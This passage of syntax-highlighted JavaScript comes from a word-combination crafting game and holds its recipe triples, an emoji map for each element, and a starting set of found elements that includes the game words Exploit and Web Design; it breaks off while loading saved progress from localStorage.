class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Storm&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Volcanic Glass&quot;</span>],[<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;Haze&quot;</span>,<span class="string">&quot;Static&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Steam&quot;</span>],[<span class="string">&quot;Dust&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Powder&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Artificial Intelligence&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Brick&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Sulfur&quot;</span>],[<span class="string">&quot;Adobe&quot;</span>,<span class="string">&quot;Graphic Design&quot;</span>,<span class="string">&quot;Web Design&quot;</span>],[<span class="string">&quot;Colorful Interface&quot;</span>,<span class="string">&quot;Data&quot;</span>,<span class="string">&quot;Visualization&quot;</span>],[<span class="string">&quot;IoT&quot;</span>,<span class="string">&quot;Security&quot;</span>,<span class="string">&quot;Encryption&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Mosaic&quot;</span>,<span class="string">&quot;Patterned Design&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Excavator&quot;</span>],[<span class="string">&quot;Cloud Computing&quot;</span>,<span class="string">&quot;Data&quot;</span>,<span class="string">&quot;Data Mining&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Mud&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Brick Oven&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Art&quot;</span>],[<span class="string">&quot;Rain&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Hydropower&quot;</span>],[<span class="string">&quot;Colorful Display&quot;</span>,<span class="string">&quot;Graphic Design&quot;</span>,<span class="string">&quot;Colorful Interface&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Mist&quot;</span>,<span class="string">&quot;Fog&quot;</span>],[<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Web Design&quot;</span>,<span class="string">&quot;XSS&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Smart Thermostat&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Magma&quot;</span>],[<span class="string">&quot;Air&quot;</span>,<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Dust&quot;</span>],[<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Rainbow Cloud&quot;</span>],[<span class="string">&quot;Dust&quot;</span>,<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Sand&quot;</span>],[<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Thunderstorm&quot;</span>,<span class="string">&quot;Lightning Conductor&quot;</span>],[<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;Rain&quot;</span>,<span class="string">&quot;Thunderstorm&quot;</span>],[<span class="string">&quot;Adobe&quot;</span>,<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;Software&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Colorful Steam&quot;</span>],[<span class="string">&quot;Dust&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Ash&quot;</span>],[<span class="string">&quot;Cement&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Marsh&quot;</span>],[<span class="string">&quot;Hot Tub&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Mud Bath&quot;</span>],[<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;Glass&quot;</span>,<span class="string">&quot;Computer Chip&quot;</span>],[<span class="string">&quot;Ceramic&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Earthenware&quot;</span>],[<span class="string">&quot;Haze&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Fog Machine&quot;</span>],[<span class="string">&quot;Rain&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Colorful Display&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Cement&quot;</span>],[<span class="string">&quot;Dust&quot;</span>,<span class="string">&quot;Haze&quot;</span>,<span class="string">&quot;Sandstorm&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Geothermal Energy&quot;</span>],[<span class="string">&quot;Ash Rock&quot;</span>,<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Mineral&quot;</span>],[<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;Software&quot;</span>,<span class="string">&quot;Program&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Data&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Algae&quot;</span>],[<span class="string">&quot;Fog&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Rain&quot;</span>],[<span class="string">&quot;Rainbow Pool&quot;</span>,<span class="string">&quot;Reflection&quot;</span>,<span class="string">&quot;Color Spectrum&quot;</span>],[<span class="string">&quot;Artificial Intelligence&quot;</span>,<span class="string">&quot;Data&quot;</span>,<span class="string">&quot;Encryption&quot;</span>],[<span class="string">&quot;Internet&quot;</span>,<span class="string">&quot;Smart Thermostat&quot;</span>,<span class="string">&quot;IoT&quot;</span>],[<span class="string">&quot;Cinder&quot;</span>,<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Ash Rock&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Mudbrick&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;Data Mining&quot;</span>],[<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Hot Spring&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Thunderstorm&quot;</span>,<span class="string">&quot;Power Surge&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Paving Stone&quot;</span>],[<span class="string">&quot;User Input&quot;</span>,<span class="string">&quot;Visualization&quot;</span>,<span class="string">&quot;Interactive Design&quot;</span>],[<span class="string">&quot;Mist&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Swamp&quot;</span>],[<span class="string">&quot;Geolocation&quot;</span>,<span class="string">&quot;Wall&quot;</span>,<span class="string">&quot;Map&quot;</span>],[<span class="string">&quot;Air&quot;</span>,<span class="string">&quot;Rock&quot;</span>,<span class="string">&quot;Internet&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Rain&quot;</span>,<span class="string">&quot;Email&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Colorful Flames&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Mineral Spring&quot;</span>,<span class="string">&quot;Healing Water&quot;</span>],[<span class="string">&quot;Ceramic&quot;</span>,<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;Lava Lamp&quot;</span>],[<span class="string">&quot;Brick Oven&quot;</span>,<span class="string">&quot;Wall&quot;</span>,<span class="string">&quot;Fireplace&quot;</span>],[<span class="string">&quot;Glass&quot;</span>,<span class="string">&quot;Software&quot;</span>,<span class="string">&quot;Vulnerability&quot;</span>],[<span class="string">&quot;Fog&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Sludge&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Marsh&quot;</span>,<span class="string">&quot;S&#x27;mores&quot;</span>],[<span class="string">&quot;Artificial Intelligence&quot;</span>,<span class="string">&quot;Data Mining&quot;</span>,<span class="string">&quot;Machine Learning&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Brick Kiln&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Heat Resistant Material&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Sludge&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>],[<span class="string">&quot;Artificial Intelligence&quot;</span>,<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Smart Device&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Heat Engine&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Cinder&quot;</span>],[<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Reflection&quot;</span>,<span class="string">&quot;Refraction&quot;</span>],[<span class="string">&quot;Encryption&quot;</span>,<span class="string">&quot;Software&quot;</span>,<span class="string">&quot;Cybersecurity&quot;</span>],[<span class="string">&quot;Graphic Design&quot;</span>,<span class="string">&quot;Mosaic&quot;</span>,<span class="string">&quot;Artwork&quot;</span>],[<span class="string">&quot;Colorful Display&quot;</span>,<span class="string">&quot;Data Mining&quot;</span>,<span class="string">&quot;Visualization&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Mineral Spring&quot;</span>],[<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Reflection&quot;</span>],[<span class="string">&quot;Air&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Smoke&quot;</span>],[<span class="string">&quot;Program&quot;</span>,<span class="string">&quot;Smart HVAC System&quot;</span>,<span class="string">&quot;Smart Thermostat&quot;</span>],[<span class="string">&quot;Haze&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Blackout&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Wall&quot;</span>],[<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Steam Locomotive&quot;</span>,<span class="string">&quot;Railway Engine&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Thunderstorm&quot;</span>,<span class="string">&quot;Volcanic Lightning&quot;</span>],[<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Silt&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Rainbow Pool&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Sand&quot;</span>,<span class="string">&quot;Glass&quot;</span>],[<span class="string">&quot;Art&quot;</span>,<span class="string">&quot;Web Design&quot;</span>,<span class="string">&quot;Graphic Design&quot;</span>],[<span class="string">&quot;Internet&quot;</span>,<span class="string">&quot;Machine Learning&quot;</span>,<span class="string">&quot;Smart HVAC System&quot;</span>],[<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;Power Surge&quot;</span>,<span class="string">&quot;Overload&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Graphic Design&quot;</span>],[<span class="string">&quot;Air&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Mist&quot;</span>],[<span class="string">&quot;Brick Oven&quot;</span>,<span class="string">&quot;Cement&quot;</span>,<span class="string">&quot;Concrete&quot;</span>],[<span class="string">&quot;Artificial Intelligence&quot;</span>,<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;Cloud Computing&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Geolocation&quot;</span>],[<span class="string">&quot;Color Spectrum&quot;</span>,<span class="string">&quot;Graphic Design&quot;</span>,<span class="string">&quot;Colorful Interface&quot;</span>],[<span class="string">&quot;Internet&quot;</span>,<span class="string">&quot;Program&quot;</span>,<span class="string">&quot;Web Design&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Overload&quot;</span>,<span class="string">&quot;Circuit Failure&quot;</span>],[<span class="string">&quot;Data Mining&quot;</span>,<span class="string">&quot;Geolocation&quot;</span>,<span class="string">&quot;Location Tracking&quot;</span>],[<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Smart Thermostat&quot;</span>,<span class="string">&quot;Smart HVAC System&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Adobe&quot;</span>],[<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;Dust&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Hot Tub&quot;</span>],[<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;Geothermal Power Plant&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Fog&quot;</span>,<span class="string">&quot;Haze&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Steam Locomotive&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Mosaic&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Electricity&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;Volcanic Ash&quot;</span>],[<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Hydroelectric Power&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;Colorful Pattern&quot;</span>],[<span class="string">&quot;Silt&quot;</span>,<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;Lava&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Software&quot;</span>,<span class="string">&quot;Program&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;Thunderstorm&quot;</span>,<span class="string">&quot;Lightning&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Clay&quot;</span>,<span class="string">&quot;Ceramic&quot;</span>],[<span class="string">&quot;Cybersecurity&quot;</span>,<span class="string">&quot;Vulnerability&quot;</span>,<span class="string">&quot;Exploit&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Ash Residue&quot;</span>],[<span class="string">&quot;Internet&quot;</span>,<span class="string">&quot;Smart Device&quot;</span>,<span class="string">&quot;Cloud Computing&quot;</span>],[<span class="string">&quot;Magma&quot;</span>,<span class="string">&quot;Mist&quot;</span>,<span class="string">&quot;Rock&quot;</span>],[<span class="string">&quot;Interactive Design&quot;</span>,<span class="string">&quot;Program&quot;</span>,<span class="string">&quot;Smart Device&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;Software&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Graphic Design&quot;</span>,<span class="string">&quot;Design Template&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Magma&quot;</span>,<span class="string">&quot;Volcano&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Computer Chip&quot;</span>],[<span class="string">&quot;Geolocation&quot;</span>,<span class="string">&quot;Location Tracking&quot;</span>,<span class="string">&quot;Real-Time Positioning&quot;</span>]];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> elements = <span class="keyword">new</span> <span class="title class_">Map</span>([[<span class="string">&quot;Sauna&quot;</span>,<span class="string">&quot;💦&quot;</span>],[<span class="string">&quot;Railway Engine&quot;</span>,<span class="string">&quot;🚂&quot;</span>],[<span class="string">&quot;Clay&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Geolocation&quot;</span>,<span class="string">&quot;📍&quot;</span>],[<span class="string">&quot;Colorful Steam&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Sand&quot;</span>,<span class="string">&quot;🏖️&quot;</span>],[<span class="string">&quot;Visualization&quot;</span>,<span class="string">&quot;📈&quot;</span>],[<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;🔩&quot;</span>],[<span class="string">&quot;Steam Locomotive&quot;</span>,<span class="string">&quot;🚂&quot;</span>],[<span class="string">&quot;Patterned Design&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Smoke&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;🏠&quot;</span>],[<span class="string">&quot;Sandstorm&quot;</span>,<span class="string">&quot;🌪️&quot;</span>],[<span class="string">&quot;Hot Tub&quot;</span>,<span class="string">&quot;🛀&quot;</span>],[<span class="string">&quot;Cybersecurity&quot;</span>,<span class="string">&quot;🔒&quot;</span>],[<span class="string">&quot;Lightning&quot;</span>,<span class="string">&quot;⚡&quot;</span>],[<span class="string">&quot;Fireplace&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Fog Machine&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Mud Bath&quot;</span>,<span class="string">&quot;🛀&quot;</span>],[<span class="string">&quot;Earthenware&quot;</span>,<span class="string">&quot;🍽️&quot;</span>],[<span class="string">&quot;Web Design&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Dust&quot;</span>,<span class="string">&quot;🌀&quot;</span>],[<span class="string">&quot;Design Template&quot;</span>,<span class="string">&quot;📋&quot;</span>],[<span class="string">&quot;Ceramic&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Sulfur&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Algae&quot;</span>,<span class="string">&quot;🌱&quot;</span>],[<span class="string">&quot;Computer Chip&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Rainbow Pool&quot;</span>,<span class="string">&quot;🏊‍♀️&quot;</span>],[<span class="string">&quot;Internet&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Thunderstorm&quot;</span>,<span class="string">&quot;🌩️&quot;</span>],[<span class="string">&quot;Cement&quot;</span>,<span class="string">&quot;🏭&quot;</span>],[<span class="string">&quot;Data&quot;</span>,<span class="string">&quot;📊&quot;</span>],[<span class="string">&quot;Oven&quot;</span>,<span class="string">&quot;🍞&quot;</span>],[<span class="string">&quot;Geothermal Energy&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Static&quot;</span>,<span class="string">&quot;💭&quot;</span>],[<span class="string">&quot;Brick Oven&quot;</span>,<span class="string">&quot;🍞&quot;</span>],[<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;💦&quot;</span>],[<span class="string">&quot;Steam&quot;</span>,<span class="string">&quot;🚂&quot;</span>],[<span class="string">&quot;S&#x27;mores&quot;</span>,<span class="string">&quot;🍪&quot;</span>],[<span class="string">&quot;Graphic Design&quot;</span>,<span class="string">&quot;🖋️&quot;</span>],[<span class="string">&quot;Art&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Geothermal Power Plant&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Circuit Failure&quot;</span>,<span class="string">&quot;💣&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;🌍&quot;</span>],[<span class="string">&quot;Real-Time Positioning&quot;</span>,<span class="string">&quot;📍&quot;</span>],[<span class="string">&quot;Power Surge&quot;</span>,<span class="string">&quot;💥&quot;</span>],[<span class="string">&quot;Smart HVAC System&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Mosaic&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Mudbrick&quot;</span>,<span class="string">&quot;🏰&quot;</span>],[<span class="string">&quot;Smart Device&quot;</span>,<span class="string">&quot;📱&quot;</span>],	[<span class="string">&#x27;Security&#x27;</span>, <span class="string">&#x27;🔒&#x27;</span>],[<span class="string">&#x27;User Input&#x27;</span>, <span class="string">&#x27;📱&#x27;</span>],[<span class="string">&quot;Vulnerability&quot;</span>,<span class="string">&quot;🚨&quot;</span>],[<span class="string">&quot;Ash Residue&quot;</span>,<span class="string">&quot;💔&quot;</span>],[<span class="string">&quot;Rock&quot;</span>,<span class="string">&quot;🤘&quot;</span>],[<span class="string">&quot;Vapor&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Healing Water&quot;</span>,<span class="string">&quot;💧&quot;</span>],[<span class="string">&quot;Excavator&quot;</span>,<span class="string">&quot;🚧&quot;</span>],[<span class="string">&quot;Map&quot;</span>,<span class="string">&quot;🗺️&quot;</span>],[<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Heat Resistant Material&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Mist&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Air&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;🌿&quot;</span>],[<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;💧&quot;</span>],[<span class="string">&quot;IoT&quot;</span>,<span class="string">&quot;📱&quot;</span>],[<span class="string">&quot;Hydropower&quot;</span>,<span class="string">&quot;💧&quot;</span>],[<span class="string">&quot;Hydroelectric Power&quot;</span>,<span class="string">&quot;💧&quot;</span>],[<span class="string">&quot;Reflection&quot;</span>,<span class="string">&quot;💭&quot;</span>],[<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Data Mining&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Smart Thermostat&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Storm&quot;</span>,<span class="string">&quot;🌪️&quot;</span>],[<span class="string">&quot;Black Rain&quot;</span>,<span class="string">&quot;🌩️&quot;</span>],[<span class="string">&quot;Rain&quot;</span>,<span class="string">&quot;🌧&quot;</span>],[<span class="string">&quot;Blackout&quot;</span>,<span class="string">&quot;💔&quot;</span>],[<span class="string">&quot;Haze&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Location Tracking&quot;</span>,<span class="string">&quot;📍&quot;</span>],[<span class="string">&quot;Software&quot;</span>,<span class="string">&quot;📊&quot;</span>],[<span class="string">&quot;Adobe&quot;</span>,<span class="string">&quot;📢&quot;</span>],[<span class="string">&quot;Color Spectrum&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;💰&quot;</span>],[<span class="string">&quot;Electricity&quot;</span>,<span class="string">&quot;💡&quot;</span>],[<span class="string">&quot;Silt&quot;</span>,<span class="string">&quot;🌀&quot;</span>],[<span class="string">&quot;Marsh&quot;</span>,<span class="string">&quot;🐢&quot;</span>],[<span class="string">&quot;Glass&quot;</span>,<span class="string">&quot;🍷&quot;</span>],[<span class="string">&quot;Volcanic Glass&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Refraction&quot;</span>,<span class="string">&quot;🔍&quot;</span>],[<span class="string">&quot;Colorful Display&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Program&quot;</span>,<span class="string">&quot;📊&quot;</span>],[<span class="string">&quot;Fog&quot;</span>,<span class="string">&quot;🌫️&quot;</span>],[<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;🚂&quot;</span>],[<span class="string">&quot;Lava Lamp&quot;</span>,<span class="string">&quot;💡&quot;</span>],[<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;☁️&quot;</span>],[<span class="string">&quot;Mineral Spring&quot;</span>,<span class="string">&quot;💧&quot;</span>],[<span class="string">&quot;XSS&quot;</span>,<span class="string">&quot;😈&quot;</span>],[<span class="string">&quot;Magma&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Sludge&quot;</span>,<span class="string">&quot;💢&quot;</span>],[<span class="string">&quot;Overload&quot;</span>,<span class="string">&quot;😩&quot;</span>],[<span class="string">&quot;Mineral&quot;</span>,<span class="string">&quot;💎&quot;</span>],[<span class="string">&quot;Volcanic Lightning&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Ash Rock&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Rainbow&quot;</span>,<span class="string">&quot;🌈&quot;</span>],[<span class="string">&quot;Rainbow Cloud&quot;</span>,<span class="string">&quot;🌈&quot;</span>],[<span class="string">&quot;Concrete&quot;</span>,<span class="string">&quot;🏛️&quot;</span>],[<span class="string">&quot;Volcanic Rock&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Artificial Intelligence&quot;</span>,<span class="string">&quot;🤖&quot;</span>],[<span class="string">&quot;Powder&quot;</span>,<span class="string">&quot;💨&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Cinder&quot;</span>,<span class="string">&quot;👠&quot;</span>],[<span class="string">&quot;Interactive Design&quot;</span>,<span class="string">&quot;📱&quot;</span>],[<span class="string">&quot;Machine Learning&quot;</span>,<span class="string">&quot;🤖&quot;</span>],[<span class="string">&quot;Lightning Conductor&quot;</span>,<span class="string">&quot;⚡&quot;</span>],[<span class="string">&quot;Hot Spring&quot;</span>,<span class="string">&quot;🛀&quot;</span>],[<span class="string">&quot;Colorful Interface&quot;</span>,<span class="string">&quot;🎨&quot;</span>],[<span class="string">&quot;Cloud Computing&quot;</span>,<span class="string">&quot;💻&quot;</span>],[<span class="string">&quot;Rainbow Fire&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Charcoal&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Encryption&quot;</span>,<span class="string">&quot;🔒&quot;</span>],[<span class="string">&quot;Volcanic Ash&quot;</span>,<span class="string">&quot;🌋&quot;</span>],[<span class="string">&quot;Brick Kiln&quot;</span>,<span class="string">&quot;🏭&quot;</span>],[<span class="string">&quot;Email&quot;</span>,<span class="string">&quot;📧&quot;</span>],[<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Wall&quot;</span>,<span class="string">&quot;🏰&quot;</span>],[<span class="string">&quot;Lava&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Colorful Flames&quot;</span>,<span class="string">&quot;🔥&quot;</span>],[<span class="string">&quot;Paving Stone&quot;</span>,<span class="string">&quot;🛠️&quot;</span>],[<span class="string">&quot;Artwork&quot;</span>,<span class="string">&quot;🎨&quot;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cache = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> found = <span class="keyword">new</span> <span class="title class_">Map</span>([[<span class="string">&#x27;Fire&#x27;</span>, <span class="string">&#x27;🔥&#x27;</span>], [<span class="string">&#x27;Water&#x27;</span>, <span class="string">&#x27;💧&#x27;</span>], [<span class="string">&#x27;Earth&#x27;</span>, <span class="string">&#x27;🌍&#x27;</span>], [<span class="string">&#x27;Air&#x27;</span>, <span class="string">&#x27;💨&#x27;</span>], [<span class="string">&#x27;Exploit&#x27;</span>,<span class="string">&#x27;💰&#x27;</span>], [<span class="string">&#x27;Web Design&#x27;</span>,<span class="string">&#x27;💻&#x27;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;found&#x27;</span>)) &#123;</span><br><span class="line">	found = <span 